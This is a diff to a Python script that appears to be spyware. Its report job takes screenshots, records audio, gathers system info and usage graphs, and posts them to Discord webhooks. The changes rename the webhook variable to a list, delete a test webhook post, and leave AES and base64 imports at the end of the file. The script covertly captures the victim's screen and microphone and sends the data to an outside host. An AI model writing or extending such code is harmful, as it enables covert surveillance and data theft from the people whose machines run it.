@@ -398,7 +398,7 @@ def report_job():
     generate_usage_graph()
     screenshot = take_screenshot()
     audio = record_audio()
-    send_to_discord(info, webhook_url, GRAPH_FILE, screenshot, audio)
+    send_to_discord(info, webhook_urls, GRAPH_FILE, screenshot, audio)
     # Log to file
     with open(LOG_FILE, "a", encoding="utf-8") as f:
         for k, v in info.items():
@@ -540,7 +540,7 @@ def send_to_webhook(content, filename=None):
     if filename and os.path.exists(filename):
         files = {"file": open(filename, "rb")}
     try:
-        r = requests.post(webhook_url, data=data, files=files)
+        r = requests.post(webhook_urls, data=data, files=files)
         if files:
             files["file"].close()
         return r.status_code == 204 or r.status_code == 200
@@ -591,10 +591,14 @@ def main():
 
 if __name__ == "__main__":
     main()
-    
+
+
+
+
+
+
+
 from Crypto.Cipher import AES
 import base64
 import requests
 
-# Use the webhook
-requests.post(webhook_url, json={"content": "Webhook secured!"})
